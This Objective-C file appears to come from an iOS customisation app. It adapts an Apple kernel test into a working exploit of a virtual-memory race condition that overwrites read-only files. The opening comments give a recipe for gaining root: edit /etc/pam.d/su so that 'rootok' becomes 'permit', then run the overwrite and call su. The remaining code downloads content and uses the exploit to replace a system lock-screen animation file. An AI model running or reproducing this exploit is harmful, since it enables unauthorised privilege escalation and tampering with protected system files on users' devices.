// from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
// modified to compile outside of XNU

// clang -o switcharoo vm_unaligned_copy_switch_race.c
// sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
// ./switcharoo /etc/pam.d/su overwrite_file.bin
// su
// modified by haxi0

@import Foundation;
#import <UIKit/UIKit.h>
#include <pthread.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>

#include <fcntl.h>
#include <sys/mman.h>

#import <ZipArchive.h>

#define T_QUIET
#define T_EXPECT_MACH_SUCCESS(a, b)
#define T_EXPECT_MACH_ERROR(a, b, c)
#define T_ASSERT_MACH_SUCCESS(a, b, ...)
#define T_ASSERT_MACH_ERROR(a, b, c)
#define T_ASSERT_POSIX_SUCCESS(a, b)
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exitApp(); }}while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exitApp(); }}while(0)
#define T_ASSERT_TRUE(a, b, ...)
#define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
#define T_DECL(a, b) static void a(void)
#define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)

void exitApp(void) {
    UIApplication *app = [UIApplication sharedApplication];
    [app performSelector:@selector(suspend)];
    [NSThread sleepForTimeInterval:2.0];
    exit(0);
}

static const char* g_arg_target_file_path;
static const char* g_arg_overwrite_file_path;

struct context1 {
    vm_size_t obj_size;
    vm_address_t e0;
    mach_port_t mem_entry_ro;
    mach_port_t mem_entry_rw;
    dispatch_semaphore_t running_sem;
    pthread_mutex_t mtx;
    bool done;
};

static void *
switcheroo_thread(__unused void *arg)
{
    kern_return_t kr;
    struct context1 *ctx;

    ctx = (struct context1 *)arg;
    /* tell main thread we're ready to run */
    dispatch_semaphore_signal(ctx->running_sem);
    while (!ctx->done) {
        /* wait for main thread to be done setting things up */
        pthread_mutex_lock(&ctx->mtx);
        /* switch e0 to RW mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_rw,
            0,
            FALSE,         /* copy */
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RW");
        /* wait a little bit */
        usleep(100);
        /* switch bakc to original RO mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
        /* tell main thread we're don switching mappings */
        pthread_mutex_unlock(&ctx->mtx);
        usleep(100);
    }
    return NULL;
}

T_DECL(unaligned_copy_switch_race,
    "Test that unaligned copy respects read-only mapping")
{
    pthread_t th = NULL;
    int ret;
    kern_return_t kr;
    time_t start, duration;
    mach_msg_type_number_t cow_read_size;
    vm_size_t copied_size;
    int loops;
    vm_address_t e2, e5;
    struct context1 context1, *ctx;
    int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
    vm_address_t ro_addr, tmp_addr;
    memory_object_size_t mo_size;

    ctx = &context1;
    ctx->obj_size = 256 * 1024;
    ctx->e0 = 0;
    ctx->running_sem = dispatch_semaphore_create(0);
    T_QUIET; T_ASSERT_NE(ctx->running_sem, NULL, "dispatch_semaphore_create");
    ret = pthread_mutex_init(&ctx->mtx, NULL);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_mutex_init");
    ctx->done = false;
    ctx->mem_entry_rw = MACH_PORT_NULL;
    ctx->mem_entry_ro = MACH_PORT_NULL;
#if 0
    /* allocate our attack target memory */
    kr = vm_allocate(mach_task_self(),
        &ro_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
    /* initialize to 'A' */
    memset((char *)ro_addr, 'A', ctx->obj_size);
#endif
    int fd = open(g_arg_target_file_path, O_RDONLY | O_CLOEXEC);
    ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
    /* make it read-only */
    kr = vm_protect(mach_task_self(),
        ro_addr,
        ctx->obj_size,
        TRUE,             /* set_maximum */
        VM_PROT_READ);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
    /* make sure we can't get read-write handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, "make_mem_entry() RO");
    /* take read-only handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    /* make sure we can't map target memory as writable */
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");

    /* allocate a source buffer for the unaligned copy */
    kr = vm_allocate(mach_task_self(),
        &e5,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
    /* initialize to 'C' */
    memset((char *)e5, 'C', ctx->obj_size);

    FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
    fseek(overwrite_file, 0, SEEK_END);
    size_t overwrite_length = ftell(overwrite_file);
    if (overwrite_length >= PAGE_SIZE) {
        fprintf(stderr, "too long!\n");
        exitApp();
    }
    fseek(overwrite_file, 0, SEEK_SET);
    char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
    fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
    fclose(overwrite_file);

    int overwrite_first_diff_offset = -1;
    char overwrite_first_diff_value = 0;
    for (int off = 0; off < overwrite_length; off++) {
        if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
            overwrite_first_diff_offset = off;
            overwrite_first_diff_value = ((char*)ro_addr)[off];
        }
    }
    if (overwrite_first_diff_offset == -1) {
        fprintf(stderr, "no diff?\n");
        exitApp();
    }

    /*
     * get a handle on some writable memory that will be temporarily
     * switched with the read-only mapping of our target memory to try
     * and trick copy_unaligned to write to our read-only target.
     */
    tmp_addr = 0;
    kr = vm_allocate(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate() some rw memory");
    /* initialize to 'D' */
    memset((char *)tmp_addr, 'D', ctx->obj_size);
    /* get a memory entry handle for that RW memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        tmp_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_rw,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RW");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    kr = vm_deallocate(mach_task_self(), tmp_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate() tmp_addr 0x%llx", (uint64_t)tmp_addr);
    tmp_addr = 0;

    pthread_mutex_lock(&ctx->mtx);

    /* start racing thread */
    ret = pthread_create(&th, NULL, switcheroo_thread, (void *)ctx);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    /* wait for racing thread to be ready to run */
    dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);

    duration = 10; /* 10 seconds */
    T_LOG("Testing for %ld seconds...", duration);
    for (start = time(NULL), loops = 0;
        time(NULL) < start + duration;
        loops++) {
        /* reserve space for our 2 contiguous allocations */
        e2 = 0;
        kr = vm_allocate(mach_task_self(),
            &e2,
            2 * ctx->obj_size,
            VM_FLAGS_ANYWHERE);
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate to reserve e2+e0");

        /* make 1st allocation in our reserved space */
        kr = vm_allocate(mach_task_self(),
            &e2,
            ctx->obj_size,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e2");
        /* initialize to 'B' */
        memset((char *)e2, 'B', ctx->obj_size);

        /* map our read-only target memory right after */
        ctx->e0 = e2 + ctx->obj_size;
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");

        /* let the racing thread go */
        pthread_mutex_unlock(&ctx->mtx);
        /* wait a little bit */
        usleep(100);

        /* trigger copy_unaligned while racing with other thread */
        kr = vm_read_overwrite(mach_task_self(),
            e5,
            ctx->obj_size,
            e2 + overwrite_length,
            &copied_size);
        T_QUIET;
        T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
            "vm_read_overwrite kr %d", kr);
        switch (kr) {
        case KERN_SUCCESS:
            /* the target was RW */
            kern_success++;
            break;
        case KERN_PROTECTION_FAILURE:
            /* the target was RO */
            kern_protection_failure++;
            break;
        default:
            /* should not happen */
            kern_other++;
            break;
        }
        /* check that our read-only memory was not modified */
        T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");

        /* tell racing thread to stop toggling mappings */
        pthread_mutex_lock(&ctx->mtx);

        /* clean up before next loop */
        vm_deallocate(mach_task_self(), ctx->e0, ctx->obj_size);
        ctx->e0 = 0;
        vm_deallocate(mach_task_self(), e2, ctx->obj_size);
        e2 = 0;
    }

    ctx->done = true;
    pthread_join(th, NULL);

    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_ro);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
    kr = vm_deallocate(mach_task_self(), ro_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
    kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");


    T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
        kern_success, kern_protection_failure, kern_other);
    T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
}

static NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
 <caml xmlns=\"http://www.apple.com/CoreAnimation/1.0\">\
   <CALayer allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 69.0 100.0\" contentsFormat=\"RGBA8\" name=\"root\" position=\"34.5 50.0\">\
     <sublayers>\
       <CALayer id=\"#3\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" geometryFlipped=\"1\" name=\"container\" position=\"34.5 50.0\">\
           <sublayers>\
             <CALayer id=\"#2\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shake\" position=\"73.5 66.0\">\
               <sublayers>\
                 <CALayer id=\"#1\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shackle\" opacity=\"1\" position=\"73.5 66.0\">\
                   <contents type=\"CGImage\" src=\"trolling1x\"/>\
                 </CALayer>\
               </sublayers>\
             </CALayer>\
           </sublayers>\
         </CALayer>\
       </sublayers>\
     <states>\
       <LKState name=\"Sleep\">\
     <elements>\
       <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"transform.scale.xy\">\
         <value type=\"real\" value=\"0.75\"/>\
       </LKStateSetValue>\
       <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"opacity\">\
         <value type=\"integer\" value=\"0\"/>\
       </LKStateSetValue>\
     </elements>\
       </LKState>\
       <LKState name=\"Locked\"/>\
       <LKState name=\"Unlocked\">\
     <elements>\
       <LKStateSetValue final=\"false\" targetId=\"#1\" keyPath=\"contents\">\
         <value type=\"CGImage\" src=\"trolling40x\"/>\
       </LKStateSetValue>\
     </elements>\
       </LKState>\
       <LKState name=\"Error\">\
     <elements>\
       <LKStateSetValue final=\"false\" targetId=\"#2\" keyPath=\"position.x\">\
         <value type=\"real\" value=\"113.5\"/>\
       </LKStateSetValue>\
       <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"position.x\">\
         <value type=\"real\" value=\"-5.5\"/>\
       </LKStateSetValue>\
     </elements>\
       </LKState>\
     </states>\
     <stateTransitions>\
       <LKStateTransition fromState=\"*\" toState=\"Unlocked\">\
     <elements>\
       <LKStateTransitionElement final=\"false\" key=\"contents\" targetId=\"#1\">\
         <animation type=\"CAKeyframeAnimation\" calculationMode=\"discrete\" keyPath=\"contents\" duration=\"1\" fillMode=\"backwards\" timingFunction=\"linear\">\
           <keyTimes>\
                 <real value=\"0\"/>\
                 <real value=\"0.01666666666\"/>\
                 <real value=\"0.03333333333\"/>\
                 <real value=\"0.05\"/>\
                 <real value=\"0.06666666666\"/>\
                 <real value=\"0.08333333333\"/>\
                 <real value=\"0.1\"/>\
                 <real value=\"0.116666666667\"/>\
                 <real value=\"0.133333333333\"/>\
                 <real value=\"0.15\"/>\
                 <real value=\"0.166666666667\"/>\
                 <real value=\"0.183333333333\"/>\
                 <real value=\"0.2\"/>\
                 <real value=\"0.216666666667\"/>\
                 <real value=\"0.233333333333\"/>\
                 <real value=\"0.25\"/>\
                 <real value=\"0.266666666667\"/>\
                 <real value=\"0.283333333333\"/>\
                 <real value=\"0.3\"/>\
                 <real value=\"0.316666666667\"/>\
                 <real value=\"0.333333333333\"/>\
                 <real value=\"0.35\"/>\
                 <real value=\"0.366666666667\"/>\
                 <real value=\"0.383333333333\"/>\
                 <real value=\"0.4\"/>\
                 <real value=\"0.416666666667\"/>\
                 <real value=\"0.433333333333\"/>\
                 <real value=\"0.45\"/>\
                 <real value=\"0.466666666667\"/>\
                 <real value=\"0.483333333333\"/>\
                 <real value=\"0.5\"/>\
                 <real value=\"0.516666666667\"/>\
                 <real value=\"0.533333333333\"/>\
                 <real value=\"0.55\"/>\
                 <real value=\"0.566666666667\"/>\
                 <real value=\"0.583333333333\"/>\
                 <real value=\"0.6\"/>\
                 <real value=\"0.616666666667\"/>\
                 <real value=\"0.633333333333\"/>\
                 <real value=\"0.65\"/>\
                 <real value=\"0.666666666667\"/>\
                 <real value=\"0.683333333333\"/>\
                 <real value=\"0.7\"/>\
                 <real value=\"0.716666666667\"/>\
                 <real value=\"0.733333333333\"/>\
                 <real value=\"0.75\"/>\
                 <real value=\"0.766666666667\"/>\
                 <real value=\"0.783333333333\"/>\
                 <real value=\"0.8\"/>\
                 <real value=\"0.816666666667\"/>\
                 <real value=\"0.833333333333\"/>\
                 <real value=\"0.85\"/>\
                 <real value=\"0.866666666667\"/>\
                 <real value=\"0.883333333333\"/>\
                 <real value=\"0.9\"/>\
           </keyTimes>\
           <values>\
                 <CGImage src=\"trolling1x\"/>\
                 <CGImage src=\"trolling2x\"/>\
                 <CGImage src=\"trolling3x\"/>\
                 <CGImage src=\"trolling4x\"/>\
                 <CGImage src=\"trolling5x\"/>\
                 <CGImage src=\"trolling6x\"/>\
                 <CGImage src=\"trolling7x\"/>\
                 <CGImage src=\"trolling8x\"/>\
                 <CGImage src=\"trolling9x\"/>\
                 <CGImage src=\"trolling10x\"/>\
                 <CGImage src=\"trolling11x\"/>\
                 <CGImage src=\"trolling12x\"/>\
                 <CGImage src=\"trolling13x\"/>\
                 <CGImage src=\"trolling14x\"/>\
                 <CGImage src=\"trolling15x\"/>\
                 <CGImage src=\"trolling16x\"/>\
                 <CGImage src=\"trolling17x\"/>\
                 <CGImage src=\"trolling18x\"/>\
                 <CGImage src=\"trolling19x\"/>\
                 <CGImage src=\"trolling20x\"/>\
                 <CGImage src=\"trolling21x\"/>\
                 <CGImage src=\"trolling22x\"/>\
                 <CGImage src=\"trolling23x\"/>\
                 <CGImage src=\"trolling24x\"/>\
                 <CGImage src=\"trolling25x\"/>\
                 <CGImage src=\"trolling26x\"/>\
                 <CGImage src=\"trolling27x\"/>\
                 <CGImage src=\"trolling28x\"/>\
                 <CGImage src=\"trolling29x\"/>\
                 <CGImage src=\"trolling30x\"/>\
                 <CGImage src=\"trolling31x\"/>\
                 <CGImage src=\"trolling32x\"/>\
                 <CGImage src=\"trolling33x\"/>\
                 <CGImage src=\"trolling34x\"/>\
                 <CGImage src=\"trolling35x\"/>\
                 <CGImage src=\"trolling36x\"/>\
                 <CGImage src=\"trolling37x\"/>\
                 <CGImage src=\"trolling38x\"/>\
                 <CGImage src=\"trolling39x\"/>\
                 <CGImage src=\"trolling40x\"/>\
           </values>\
         </animation>\
       </LKStateTransitionElement>\
     </elements>\
       </LKStateTransition>\
       <LKStateTransition fromState=\"Unlocked\" toState=\"*\">\
     <elements/>\
       </LKStateTransition>\
       <LKStateTransition fromState=\"*\" toState=\"Sleep\">\
     <elements>\
       <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
       <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
     </elements>\
       </LKStateTransition>\
       <LKStateTransition fromState=\"Sleep\" toState=\"*\">\
     <elements>\
       <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
       <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
     </elements>\
       </LKStateTransition>\
       <LKStateTransition fromState=\"*\" toState=\"Error\">\
     <elements>\
       <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.2\" fillMode=\"both\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
       <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
         <animation type=\"CASpringAnimation\" damping=\"40\" mass=\"3\" stiffness=\"2200\" keyPath=\"position.x\" beginTime=\"0.075\" duration=\"0.78\" fillMode=\"both\" speed=\"1.4\"/>\
       </LKStateTransitionElement>\
     </elements>\
       </LKStateTransition>\
       <LKStateTransition fromState=\"Error\" toState=\"*\">\
     <elements>\
       <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
         <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
       <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
         <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
       </LKStateTransitionElement>\
     </elements>\
       </LKStateTransition>\
     </stateTransitions>\
   </CALayer>\
 </caml>\
 ";

void overwriteLock(BOOL *media, NSString *url, NSString *path) {
    if (media == true) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of custom zip file");
            NSString *urlToDownload = url;
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"TrollLock.zip"];
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [SSZipArchive unzipFileAtPath:filePath toDestination:documentsDirectory];
                    NSLog(@"yay! success");
                });
            }
            
        });
        
        for (int i = 1; i <= 40; i++) {
            NSString *extension = @".png";
            const char *extensionChar = extension.UTF8String;
            NSString *trollFileName = [NSString stringWithFormat:@"trollformation%d%s",  i, extensionChar];
            NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
            NSString *documentsDirectory = [paths objectAtIndex:0];
            NSString *trollPath = [documentsDirectory stringByAppendingPathComponent:trollFileName];
            NSString *trollReplace = [NSString stringWithFormat:@"trolling%dx", i];
            
            fileContents = [fileContents stringByReplacingOccurrencesOfString:trollReplace withString:trollPath];
        }
        
        NSLog(@"%@", fileContents); // Just in case? :D
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of main.caml");
            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [fileContents writeToFile:filePath atomically:YES];
                    NSLog(@"yay! success");
                });
            }
            
        });
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
            NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
            const char *model_path = dirName.UTF8String;
            const char *target = path.UTF8String;
            g_arg_target_file_path = target;
            g_arg_overwrite_file_path = model_path;
            unaligned_copy_switch_race();
        });
    } else {
        for (int i = 1; i <= 40; i++) {
                 NSString *trollFileName = [NSString stringWithFormat:@"trollformation%d", i];
                 NSString *trollPath = [[NSBundle mainBundle] pathForResource:trollFileName ofType:@"png"];
                 NSString *trollReplace = [NSString stringWithFormat:@"trolling%dx", i];

                 fileContents = [fileContents stringByReplacingOccurrencesOfString:trollReplace withString:trollPath];
             }
        
        NSLog(@"%@", fileContents); // Just in case? :D
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of main.caml");
            NSString *urlToDownload = @"https://raw.githubusercontent.com/haxi0/TrollLock-Reborn/main/assets/main.caml";
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"main.caml"];

                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [fileContents writeToFile:filePath atomically:YES];
                    NSLog(@"yay! success");
                });
            }
            
        });
        
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
            NSString *docDir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
            NSString *dirName = [docDir stringByAppendingPathComponent:@"main.caml"];
            const char *model_path = dirName.UTF8String;
            const char *target = path.UTF8String;
            g_arg_target_file_path = target;
            g_arg_overwrite_file_path = model_path;
            unaligned_copy_switch_race();
        });
    }
}
